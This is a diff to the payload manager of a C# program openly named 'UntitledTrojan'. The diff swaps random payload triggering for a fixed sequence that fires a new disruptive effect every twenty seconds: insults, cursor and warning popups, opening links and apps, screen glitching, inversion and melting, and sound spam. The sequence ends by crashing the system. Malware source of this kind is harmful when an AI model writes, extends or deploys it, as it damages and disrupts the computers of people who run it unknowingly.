@@ -3,36 +3,43 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 using UntitledTrojan.Tools;
 
 namespace UntitledTrojan.Payloads
 {
     internal static class PayloadsManager
     {
-        private static Random random = new Random();
-        private static int ticks = 0;
-        private static int delay = 8;
-        private static int payloadOnTick = 8;
-        private static List<Action> payloads = new List<Action>();
-
-        internal static void InitializePayloads()
+        internal static async Task OnTick()
         {
-            // Add all payloads to the list
-            payloads.Add(new Action(() => DisplayFuck.StartGlitch(random.Next(500, 2000))));
-            payloads.Add(new Action(() => DisplayFuck.StartWarn(random.Next(500, 2000))));
-            payloads.Add(new Action(() => Insulting.ShowInsult()));
-        }
-
-        internal static void OnTick()
-        {
-            // Activate a random payload if needed
-            ticks++;
-            if (ticks == payloadOnTick)
-            {
-                payloadOnTick += delay;
-                int index = random.Next(0, payloads.Count);
-                payloads[index].Invoke();
-            }
+            await Task.Delay(20000);
+            Insulting.ShowInsult();
+            await Task.Delay(20000);
+            DisplayFuck.StartWarnCursor(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartWarn(1000000);
+            await Task.Delay(20000);
+            if (!Entry.debug) DisplayFuck.StartLinks(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartTextFucker(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartSounds(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartReverse(1000000);
+            await Task.Delay(20000);
+            if (!Entry.debug) DisplayFuck.StartApps(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartGlitch(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartInvert(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartMelter(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartRecursive(1000000);
+            await Task.Delay(20000);
+            DisplayFuck.StartScreenGlitch(1000000);
+            await Task.Delay(20000);
+            Entry.Crash();
         }
     }
 }
